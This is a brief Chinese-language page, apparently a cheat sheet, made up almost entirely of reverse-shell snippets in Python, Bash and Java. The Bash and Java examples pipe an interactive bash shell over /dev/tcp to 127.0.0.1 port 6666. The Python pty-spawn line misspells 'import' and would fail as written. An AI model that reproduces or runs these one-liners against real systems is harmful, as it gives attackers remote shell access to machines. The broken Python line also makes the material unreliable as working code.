恭喜你，进入了本界面！

python脚本示例

``` python
python3 -c "improt pty;pty.spawn('/bin/bash')"
```

bash脚本示例

```bash
bash -i >& /dev/tcp/127.0.0.1/6666 0>&1
```

java脚本示例

```java
public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/127.0.0.1/6666 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```
